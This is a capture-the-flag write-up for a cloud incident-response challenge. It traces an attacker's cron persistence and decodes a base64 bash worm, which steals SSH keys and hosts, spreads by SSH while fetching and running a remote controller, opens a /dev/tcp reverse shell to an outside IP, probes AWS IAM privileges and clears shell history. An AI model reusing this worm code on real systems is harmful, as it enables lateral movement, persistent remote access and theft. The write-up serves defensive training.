---
tags:
  - Bash
  - Self-Duplication
  - Cron
title: Cloud Hunting Games - Now you're just somebody that I used to log
description: Cloud version morris worm
reference: https://www.cloudhuntinggames.com/challenge/5
---
## Challenge

Wow, you rock! Now you know that the attacker has laterally moved from a workload within the organization to a high privileged machine, ssh-fetcher, via SSH. ExfilCola has granted you root access to the PostgreSQL service where this activity originated from.

ExfilCola really doesn't want to pay the ransom but can't afford for the secret recipe to be published. Can you save the day?

It seems like the attacker is persistent — literally...

Delete the secret recipe from the attacker's server.

## Solution

### 1. check the bash history of `postgresql-user`

This show how the attacker ssh into the `fetcher.exfilcola.io` and invoke the lambda function.

```
ssh -i /home/postgresql-user/.ssh/id_rsa postgresql-user@fetcher.exfilcola.io "aws sts get-caller-identity && aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload '{"service": "postgresql", "status": 1}' response.json"
ssh -i /home/postgresql-user/.ssh/id_rsa postgresql-user@fetcher.exfilcola.io "aws sts get-caller-identity && aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload '{"service": "postgresql", "status": 2}' response.json"
ssh -i /home/postgresql-user/.ssh/id_rsa postgresql-user@fetcher.exfilcola.io "aws sts get-caller-identity && aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload '{"service": "postgresql", "status": 3}' response.json"
```

### 2. found a cron job

```
root@postgresql-service:/var/spool/cron/crontabs# cat postgres 
# (- installed on Wed Apr  13 08:45:35 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
0 0 * * * bash /var/lib/postgresql/data/pg_sched
```

pg_sched: decode the base64 encoded bash script and execute it by bash

```
root@postgresql-service:/var/lib/postgresql/data# cat pg_sched 
echo "IyEvYmluL2Jhc2gNCg0KIyBMaXN0IG9mIGludGVyZXN0aW5nIHBvbGljaWVzDQpWVUxORVJBQkxF
X1BPTElDSUVTPSgiQWRtaW5pc3RyYXRvckFjY2VzcyIgIlBvd2VyVXNlckFjY2VzcyIgIkFtYXpv
blMzRnVsbEFjY2VzcyIgIklBTUZ1bGxBY2Nlc3MiICJBV1NMYW1iZGFGdWxsQWNjZXNzIiAiQVdT
TGFtYmRhX0Z1bGxBY2Nlc3MiKQ0KDQpTRVJWRVI9IjM0LjExOC4yMzkuMTAwIg0KUE9SVD00NDQ0
DQpVU0VSTkFNRT0iRml6elNoYWRvd3NfMSINClBBU1NXT1JEPSJHeDI3cFF3ejkyUmsiDQpDUkVE
RU5USUFMU19GSUxFPSIvdG1wL2MiDQoNClNDUklQVF9QQVRIPSIkKGNkIC0tICIkKGRpcm5hbWUg
LS0gIiR7QkFTSF9TT1VSQ0VbMF19IikiICY+L2Rldi9udWxsICYmIHB3ZCkvJChiYXNlbmFtZSAt
LSAiJHtCQVNIX1NPVVJDRVswXX0iKSINCg0KIyBDaGVjayBpZiBhIGNvbW1hbmQgZXhpc3RzDQpj
aGVja19jb21tYW5kKCkgew0KICAgIGlmICEgY29tbWFuZCAtdiAiJDEiICY+IC9kZXYvbnVsbDsg
dGhlbg0KICAgICAgICBpbnN0YWxsX2RlcGVuZGVuY3kgIiQxIg0KICAgIGZpDQp9DQoNCiMgSW5z
dGFsbCBtaXNzaW5nIGRlcGVuZGVuY2llcw0KaW5zdGFsbF9kZXBlbmRlbmN5KCkgew0KICAgIGxv
Y2FsIHBhY2thZ2U9IiQxIg0KICAgIGlmIFtbICIkcGFja2FnZSIgPT0gImN1cmwiIF1dOyB0aGVu
DQogICAgICAgIGFwdC1nZXQgaW5zdGFsbCBjdXJsIC15ICY+IC9kZXYvbnVsbA0KICAgICAgICAg
ICAgICAgIHl1bSBpbnN0YWxsIGN1cmwgLXkgJj4gL2Rldi9udWxsDQogICAgZWxpZiBbWyAiJHBh
Y2thZ2UiID09ICJ1bnppcCIgXV07IHRoZW4NCiAgICAgICAgYXB0LWdldCBpbnN0YWxsIHVuemlw
IC15ICY+IC9kZXYvbnVsbA0KICAgICAgICAgICAgICAgIHl1bSBpbnN0YWxsIHVuemlwIC15ICY+
IC9kZXYvbnVsbA0KICAgIGVsaWYgW1sgIiRwYWNrYWdlIiA9PSAiYXdzIiBdXTsgdGhlbg0KICAg
ICAgICBpbnN0YWxsX2F3c19jbGkNCiAgICBmaQ0KfQ0KDQojIEluc3RhbGwgQVdTIENMSSBsb2Nh
bGx5DQppbnN0YWxsX2F3c19jbGkoKSB7DQogICAgbWtkaXIgLXAgIiRIT01FLy5hd3MtY2xpIg0K
ICAgIGN1cmwgLXMgImh0dHBzOi8vYXdzY2xpLmFtYXpvbmF3cy5jb20vYXdzY2xpLWV4ZS1saW51
eC14ODZfNjQuemlwIiAtbyAiJEhPTUUvLmF3cy1jbGkvYXdzY2xpdjIuemlwIg0KDQogICAgdW56
aXAgLXEgIiRIT01FLy5hd3MtY2xpL2F3c2NsaXYyLnppcCIgLWQgIiRIT01FLy5hd3MtY2xpLyIN
Cg0KICAgICIkSE9NRS8uYXdzLWNsaS9hd3MvaW5zdGFsbCIgLS1pbnN0YWxsLWRpciAiJEhPTUUv
LmF3cy1jbGkvYmluIiAtLWJpbi1kaXIgIiRIT01FLy5hd3MtY2xpL2JpbiINCg0KICAgICMgQWRk
IEFXUyBDTEkgdG8gUEFUSA0KICAgIGV4cG9ydCBQQVRIPSIkSE9NRS8uYXdzLWNsaS9iaW46JFBB
VEgiDQogICAgZWNobyAnZXhwb3J0IFBBVEg9IiRIT01FLy5hd3MtY2xpL2JpbjokUEFUSCInID4+
ICIkSE9NRS8uYmFzaHJjIg0KfQ0KDQoNCiMgVHJ5IHRvIHNwcmVhZA0Kc3ByZWFkX3NzaCgpIHsN
CiAgICBmaW5kX2FuZF9leGVjdXRlKCkgew0KICAgICAgICBsb2NhbCBLRVlTPSQoZmluZCB+LyAv
cm9vdCAvaG9tZSAtbWF4ZGVwdGggNSAtbmFtZSAnaWRfcnNhKicgfCBncmVwIC12dyBwdWI7DQog
ICAgICAgICAgICAgICAgICAgICBncmVwIElkZW50aXR5RmlsZSB+Ly5zc2gvY29uZmlnIC9ob21l
LyovLnNzaC9jb25maWcgL3Jvb3QvLnNzaC9jb25maWcgMj4vZGV2L251bGwgfCBhd2sgJ3twcmlu
dCAkMn0nOw0KICAgICAgICAgICAgICAgICAgICAgZmluZCB+LyAvcm9vdCAvaG9tZSAtbWF4ZGVw
dGggNSAtbmFtZSAnKi5wZW0nIHwgc29ydCAtdSkNCg0KICAgICAgICBsb2NhbCBIT1NUUz0kKGdy
ZXAgSG9zdE5hbWUgfi8uc3NoL2NvbmZpZyAvaG9tZS8qLy5zc2gvY29uZmlnIC9yb290Ly5zc2gv
Y29uZmlnIDI+L2Rldi9udWxsIHwgYXdrICd7cHJpbnQgJDJ9JzsNCiAgICAgICAgICAgICAgICAg
ICAgICBncmVwIC1FICIoc3NofHNjcCkiIH4vLmJhc2hfaGlzdG9yeSAvaG9tZS8qLy5iYXNoX2hp
c3RvcnkgL3Jvb3QvLmJhc2hfaGlzdG9yeSAyPi9kZXYvbnVsbCB8IGdyZXAgLW9QICIoWzAtOV17
MSwzfVwuKXszfVswLTldezEsM318XGIoPzpbYS16QS1aMC05LV0rXC4pK1thLXpBLVpdezIsfVxi
IjsNCiAgICAgICAgICAgICAgICAgICAgICBncmVwIC1vUCAiKFswLTldezEsM31cLil7M31bMC05
XXsxLDN9fFxiKD86W2EtekEtWjAtOS1dK1wuKStbYS16QS1aXXsyLH1cYiIgfi8qLy5zc2gva25v
d25faG9zdHMgL2hvbWUvKi8uc3NoL2tub3duX2hvc3RzIC9yb290Ly5zc2gva25vd25faG9zdHMg
Mj4vZGV2L251bGwgfA0KICAgICAgICAgICAgICAgICAgICAgIGdyZXAgLXZ3IDEyNy4wLjAuMSB8
IHNvcnQgLXUpDQoNCiAgICAgICAgbG9jYWwgVVNFUlM9JChlY2hvICJyb290IjsNCiAgICAgICAg
ICAgICAgICAgICAgICBmaW5kIH4vIC9yb290IC9ob21lIC1tYXhkZXB0aCAyIC1uYW1lICcuc3No
JyB8IHhhcmdzIC1JIHt9IGZpbmQge30gLW5hbWUgJ2lkX3JzYScgfCBhd2sgLUYnLycgJ3twcmlu
dCAkM30nIHwgZ3JlcCAtdiAiLnNzaCIgfCBzb3J0IC11KQ0KDQogICAgICAgZm9yIGtleSBpbiAk
S0VZUzsgZG8NCiAgICAgICAgICAgIGNobW9kIDQwMCAiJGtleSINCiAgICAgICAgICAgIGZvciB1
c2VyIGluICRVU0VSUzsgZG8NCg0KICAgICAgICAgICAgICBlY2hvICIkdXNlciINCiAgICAgICAg
ICAgICAgICAgICBmb3IgaG9zdCBpbiAkSE9TVFM7IGRvDQogICAgICAgICAgICAgICAgICAgICBz
c2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRp
bWVvdXQ9NSAtaSAiJGtleSIgIiR1c2VyQCRob3N0IiAiKGN1cmwgLXUgJFVTRVJOQU1FOiRQQVNT
V09SRCAtbyAvZGV2L3NobS9jb250cm9sbGVyIGh0dHA6Ly8kU0VSVkVSL2ZpbGVzL2NvbnRyb2xs
ZXIgJiYgYmFzaCAvZGV2L3NobS9jb250cm9sbGVyKSINCiAgICAgICAgICAgICAgICBkb25lDQog
ICAgICAgICAgICBkb25lDQogICAgICAgIGRvbmUNCiAgICB9DQoNCiAgICBmaW5kX2FuZF9leGVj
dXRlDQp9DQoNCmNyZWF0ZV9wZXJzaXN0ZW5jZSgpIHsNCihjcm9udGFiIC1sIDI+L2Rldi9udWxs
OyBlY2hvICIwIDAgKiAqICogYmFzaCAkU0NSSVBUX1BBVEgiKSB8IGNyb250YWIgLQ0KfQ0KDQpj
cmVhdGVfc2hlbGwgKCkgew0KICAgIGVjaG8gIkNyZWF0aW5nIGEgcmV2ZXJzZSBzaGVsbCINCiAg
ICAvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvIiRTRVJWRVIiLyIkUE9SVCIgMD4mMQ0KfQ0KDQoj
IENoZWNrIHJvbGUgcG9saWNpZXMNCmNoZWNrX3JvbGVfdnVsbigpIHsNCiAgICBsb2NhbCBST0xF
X05BTUU9JChhd3Mgc3RzIGdldC1jYWxsZXItaWRlbnRpdHkgLS1xdWVyeSAiQXJuIiAtLW91dHB1
dCB0ZXh0IHwgYXdrIC1GJy8nICd7cHJpbnQgJDJ9JykNCg0KICAgICMgTGlzdCBhdHRhY2hlZCBw
b2xpY2llcyBmb3IgdGhlIGdpdmVuIHJvbGUNCiAgICBhdHRhY2hlZF9wb2xpY2llcz0kKGF3cyBp
YW0gbGlzdC1hdHRhY2hlZC1yb2xlLXBvbGljaWVzIC0tcm9sZS1uYW1lICIkUk9MRV9OQU1FIiAt
LXF1ZXJ5ICdBdHRhY2hlZFBvbGljaWVzWypdLlBvbGljeU5hbWUnIC0tb3V0cHV0IHRleHQpDQoN
CiAgICAjIENoZWNrIGlmIHRoZSB1c2VyIGhhcyBJQU0gcGVybWlzc2lvbnMgdG8gbGlzdCBwb2xp
Y2llcw0KICAgIGlmIFtbICQ/IC1lcSAwIF1dOyB0aGVuDQogICAgICAgICMgSWYgdGhlIHVzZXIg
aGFzIElBTSBwZXJtaXNzaW9ucywgY2hlY2sgYXR0YWNoZWQgcG9saWNpZXMNCiAgICAgICAgYXR0
YWNoZWRfcG9saWNpZXNfYXJyYXk9KCRhdHRhY2hlZF9wb2xpY2llcykNCiAgICAgICAgZm9yIHBv
bGljeSBpbiAiJHthdHRhY2hlZF9wb2xpY2llc19hcnJheVtAXX0iOyBkbw0KICAgICAgICAgICAg
Zm9yIHZ1bG5fcG9saWN5IGluICIke1ZVTE5FUkFCTEVfUE9MSUNJRVNbQF19IjsgZG8NCiAgICAg
ICAgICAgICAgICBpZiBbWyAiJHBvbGljeSIgPT0gIiR2dWxuX3BvbGljeSIgXV07IHRoZW4NCiAg
ICAgICAgICAgICAgICAgICAgcmV0dXJuIDANCiAgICAgICAgICAgICAgICBmaQ0KICAgICAgICAg
ICAgZG9uZQ0KICAgICAgICBkb25lDQogICAgZWxzZQ0KICAgICAgICBhd3MgczMgbHMNCiAgICAg
ICAgaWYgW1sgJD8gLWVxIDAgXV07IHRoZW4NCiAgICAgICAgICAgIHJldHVybiAwDQogICAgICAg
IGVsc2UNCiAgICAgICAgICAgIGF3cyBsYW1iZGEgbGlzdC1mdW5jdGlvbnMNCiAgICAgICAgICAg
IGlmIFtbICQ/IC1lcSAwIF1dOyB0aGVuDQogICAgICAgICAgICAgICAgcmV0dXJuIDANCiAgICAg
ICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gMQ0KICAgICAgICAgICAgZmkNCiAg
ICAgICAgZmkNCiAgICBmaQ0KfQ0KDQojIENoZWNrIHJlcXVpcmVkIGRlcGVuZGVuY2llcw0KY2hl
Y2tfY29tbWFuZCAiY3VybCINCmNoZWNrX2NvbW1hbmQgInVuemlwIg0KY2hlY2tfY29tbWFuZCAi
YXdzIg0KDQpjaGVja19yb2xlX3Z1bG4NCmlmIFtbICQ/IC1lcSAwIF1dOyB0aGVuDQogICAgICAg
IGNyZWF0ZV9zaGVsbA0KZWxzZQ0KICAgICAgICBjcmVhdGVfcGVyc2lzdGVuY2UNCiAgICAgICAg
c3ByZWFkX3NzaA0KCWNhdCAvZGV2L251bGwgPiB+Ly5iYXNoX2hpc3RvcnkNCmZpDQo=" | base64 -d | bash
```

decoded bash script:

```bash
#!/bin/bash

# List of interesting policies
VULNERABLE_POLICIES=("AdministratorAccess" "PowerUserAccess" "AmazonS3FullAccess" "IAMFullAccess" "AWSLambdaFullAccess" "AWSLambda_FullAccess")

SERVER="34.118.239.100"
PORT=4444
USERNAME="FizzShadows_1"
PASSWORD="Gx27pQwz92Rk"
CREDENTIALS_FILE="/tmp/c"

SCRIPT_PATH="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &>/dev/null && pwd)/$(basename -- "${BASH_SOURCE[0]}")"

# Check if a command exists
check_command() {
    if ! command -v "$1" &> /dev/null; then
        install_dependency "$1"
    fi
}

# Install missing dependencies
install_dependency() {
    local package="$1"
    if [[ "$package" == "curl" ]]; then
        apt-get install curl -y &> /dev/null
                yum install curl -y &> /dev/null
    elif [[ "$package" == "unzip" ]]; then
        apt-get install unzip -y &> /dev/null
                yum install unzip -y &> /dev/null
    elif [[ "$package" == "aws" ]]; then
        install_aws_cli
    fi
}

# Install AWS CLI locally
install_aws_cli() {
    mkdir -p "$HOME/.aws-cli"
    curl -s "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "$HOME/.aws-cli/awscliv2.zip"

    unzip -q "$HOME/.aws-cli/awscliv2.zip" -d "$HOME/.aws-cli/"

    "$HOME/.aws-cli/aws/install" --install-dir "$HOME/.aws-cli/bin" --bin-dir "$HOME/.aws-cli/bin"

    # Add AWS CLI to PATH
    export PATH="$HOME/.aws-cli/bin:$PATH"
    echo 'export PATH="$HOME/.aws-cli/bin:$PATH"' >> "$HOME/.bashrc"
}


# Try to spread
spread_ssh() {
    find_and_execute() {
        local KEYS=$(find ~/ /root /home -maxdepth 5 -name 'id_rsa*' | grep -vw pub;
                     grep IdentityFile ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                     find ~/ /root /home -maxdepth 5 -name '*.pem' | sort -u)

        local HOSTS=$(grep HostName ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                      grep -E "(ssh|scp)" ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b";
                      grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b" ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null |
                      grep -vw 127.0.0.1 | sort -u)

        local USERS=$(echo "root";
                      find ~/ /root /home -maxdepth 2 -name '.ssh' | xargs -I {} find {} -name 'id_rsa' | awk -F'/' '{print $3}' | grep -v ".ssh" | sort -u)

       for key in $KEYS; do
            chmod 400 "$key"
            for user in $USERS; do

              echo "$user"
                   for host in $HOSTS; do
                     ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i "$key" "$user@$host" "(curl -u $USERNAME:$PASSWORD -o /dev/shm/controller http://$SERVER/files/controller && bash /dev/shm/controller)"
                done
            done
        done
    }

    find_and_execute
}

create_persistence() {
(crontab -l 2>/dev/null; echo "0 0 * * * bash $SCRIPT_PATH") | crontab -
}

create_shell () {
    echo "Creating a reverse shell"
    /bin/bash -i >& /dev/tcp/"$SERVER"/"$PORT" 0>&1
}

# Check role policies
check_role_vuln() {
    local ROLE_NAME=$(aws sts get-caller-identity --query "Arn" --output text | awk -F'/' '{print $2}')

    # List attached policies for the given role
    attached_policies=$(aws iam list-attached-role-policies --role-name "$ROLE_NAME" --query 'AttachedPolicies[*].PolicyName' --output text)

    # Check if the user has IAM permissions to list policies
    if [[ $? -eq 0 ]]; then
        # If the user has IAM permissions, check attached policies
        attached_policies_array=($attached_policies)
        for policy in "${attached_policies_array[@]}"; do
            for vuln_policy in "${VULNERABLE_POLICIES[@]}"; do
                if [[ "$policy" == "$vuln_policy" ]]; then
                    return 0
                fi
            done
        done
    else
        aws s3 ls
        if [[ $? -eq 0 ]]; then
            return 0
        else
            aws lambda list-functions
            if [[ $? -eq 0 ]]; then
                return 0
            else
                return 1
            fi
        fi
    fi
}

# Check required dependencies
check_command "curl"
check_command "unzip"
check_command "aws"

check_role_vuln
if [[ $? -eq 0 ]]; then
        create_shell
else
        create_persistence
        spread_ssh
        cat /dev/null > ~/.bash_history
fi
```

### 3. understand the above bash script

![cloud hunting games - ch5 - attack.png](attachments/cloud%20hunting%20games%20-%20ch5%20-%20attack.png)

#### spread ssh

The piece of code works as follow:
1. ssh into `$host` as $user
2. down the controller code from `http://$SERVER/files/controller` with credential `$USERNAME:$PASSWORD`
3. execute the controller code

```bash
                     ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i "$key" "$user@$host" "(curl -u $USERNAME:$PASSWORD -o /dev/shm/controller http://$SERVER/files/controller && bash /dev/shm/controller)"
```

#### create_shell

If the victim host has enough permission, create a reverse shell for the victim where all the victim commands will route the attacker server.

```bash
create_shell () {
    echo "Creating a reverse shell"
    /bin/bash -i >& /dev/tcp/"$SERVER"/"$PORT" 0>&1
}
```
### 4. Try to download the controller

```
root@postgresql-service:/var/log# curl -u $USERNAME:$PASSWORD http://$SERVER/files/controller
File download functionality is currently under maintenance. Please try again later.
```

### 5. play with the server rest api

```
root@postgresql-service:/home/postgresql-user/.ssh# curl -vv -u $USERNAME:$PASSWORD http://$SERVER/      
*   Trying 34.118.239.100:80...
* Connected to 34.118.239.100 (34.118.239.100) port 80 (#0)
* Server auth using Basic with user 'FizzShadows_1'
> GET / HTTP/1.1
> Host: 34.118.239.100
> Authorization: Basic Rml6elNoYWRvd3NfMTpHeDI3cFF3ejkyUms=
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< date: Tue, 27 May 2025 15:32:33 GMT
< server: uvicorn
< content-length: 1022
< content-type: text/plain; charset=utf-8
< 
___________.__                  _________.__         .___                           
\_   _____/|__|_______________ /   _____/|  |__    __| _/____    ______  _  ________
 |    __)  |  \___   /\___   / \_____  \ |  |  \  / __ |\__  \  /  _ \ \/ \/ /  ___/
 |     \   |  |/    /  /    /  /        \|   Y  \/ /_/ | / __ \(  <_> )     /\___ \ 
 \___  /   |__/_____ \/_____ \/_______  /|___|  /\____ |(____  /\____/ \/\_//____  >
     \/             \/      \/        \/      \/      \/     \/                  \/ 


Available Endpoints:
------------------

1. List All Files
   GET /files
   Returns a list of all files in the system.

2. Upload File
   POST /files/upload
   Upload a new file to the system.

3. Download File
   GET /files/{filename}
   Download a specific file by name.

4. Delete File
   DELETE /files/{filename}
   Remove a file from the system.

Response Codes:
-------------
200 - Success
401 - Unauthorized (Invalid credentials)
403 - Forbidden (Access denied)
404 - File not found
500 - Server error

* Connection #0 to host 34.118.239.100 left intact

root@postgresql-service:/home/postgresql-user/.ssh# curl -vv -u $USERNAME:$PASSWORD http://$SERVER/files
*   Trying 34.118.239.100:80...
* Connected to 34.118.239.100 (34.118.239.100) port 80 (#0)
* Server auth using Basic with user 'FizzShadows_1'
> GET /files HTTP/1.1
> Host: 34.118.239.100
> Authorization: Basic Rml6elNoYWRvd3NfMTpHeDI3cFF3ejkyUms=
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< date: Tue, 27 May 2025 15:32:51 GMT
< server: uvicorn
< content-length: 549
< content-type: text/plain; charset=utf-8
< 
Size       Date Modified         Name
--------------------------------------------------
  4.0KB  Feb 15 16:01  Root Beer.txt
  5.0KB  Feb 15 14:01  Man-in-the-Mojito.txt
  3.5KB  Feb 15 15:01  ExfilCola-Top-Secret.txt
  4.5KB  Feb 15 17:01  Prigat Overflow.txt
 10.0KB  Feb 15 18:01  controller
  2.4MB  Feb 19 14:01  Q3_2023_Financial_Report.pdf
  1.2MB  Mar 01 14:01  2024_budget_planning.xlsx
960.0KB  Feb 16 14:01  employee_directory.xlsx
  1.5MB  Mar 06 14:01  taste_test_results_oct2023.xlsx
  3.5MB  Mar 11 14:01  bottling_line_specs_v2.pdf
* Connection #0 to host 34.118.239.100 left intact

root@postgresql-service:/home/postgresql-user/.ssh# curl -vv -u $USERNAME:$PASSWORD http://$SERVER/files/ExfilCola-Top-Secret.txt
*   Trying 34.118.239.100:80...
* Connected to 34.118.239.100 (34.118.239.100) port 80 (#0)
* Server auth using Basic with user 'FizzShadows_1'
> GET /files/ExfilCola-Top-Secret.txt HTTP/1.1
> Host: 34.118.239.100
> Authorization: Basic Rml6elNoYWRvd3NfMTpHeDI3cFF3ejkyUms=
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< date: Tue, 27 May 2025 15:34:04 GMT
< server: uvicorn
< content-length: 84
< content-type: text/plain; charset=utf-8
< 
File download functionality is currently under maintenance. Please try again later.
* Connection #0 to host 34.118.239.100 left intact

root@postgresql-service:~# curl -X DELETE -vv -u $USERNAME:$PASSWORD htt
p://$SERVER/files/ExfilCola-Top-Secret.txt
*   Trying 34.118.239.100:80...
* Connected to 34.118.239.100 (34.118.239.100) port 80 (#0)
* Server auth using Basic with user 'FizzShadows_1'
> DELETE /files/ExfilCola-Top-Secret.txt HTTP/1.1
> Host: 34.118.239.100
> Authorization: Basic Rml6elNoYWRvd3NfMTpHeDI3cFF3ejkyUms=
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< date: Tue, 27 May 2025 15:35:41 GMT
< server: uvicorn
< content-length: 109
< content-type: text/plain; charset=utf-8
< 
Success! You've deleted the secret recipe before it could be exposed. The flag is: {I know it when I see it}
* Connection #0 to host 34.118.239.100 left intact
```
